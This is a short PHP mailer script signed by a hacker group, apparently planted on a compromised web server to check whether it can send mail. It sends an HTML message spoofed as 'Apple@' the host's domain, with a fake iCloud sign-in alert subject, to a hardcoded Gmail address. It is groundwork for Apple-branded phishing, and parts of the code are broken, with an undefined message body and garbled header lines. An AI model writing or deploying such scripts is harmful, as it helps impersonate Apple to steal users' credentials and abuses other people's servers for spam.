<body bgcolor="black"> 
<?php 
/* made by Raymond7 */ 
/* Garuda Security Hacker ! */ 
/* mail.php */ 
$name = "Apple"; $to = "gleenroberto@gmail.com"; $web="$_SERVER[HTTP_HOST]"; 
$subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
$email = "Apple@$web"; 
$headers = 'From: ' .
$email . "\r\n". 
$headers = "Content-type: text/html\r\n"; 'Reply-To: ' . 
$email. "\r\n" . 'X-Mailer: PHP/' . phpversion(); 
if (mail($to,
$subject,
$body,
$headers,$name)) 
{ echo("<font color=lime>Email sended to => $to </font>"); 
} else 
{ 
echo("<font color=red>Not support for mailer</font>"); } ?>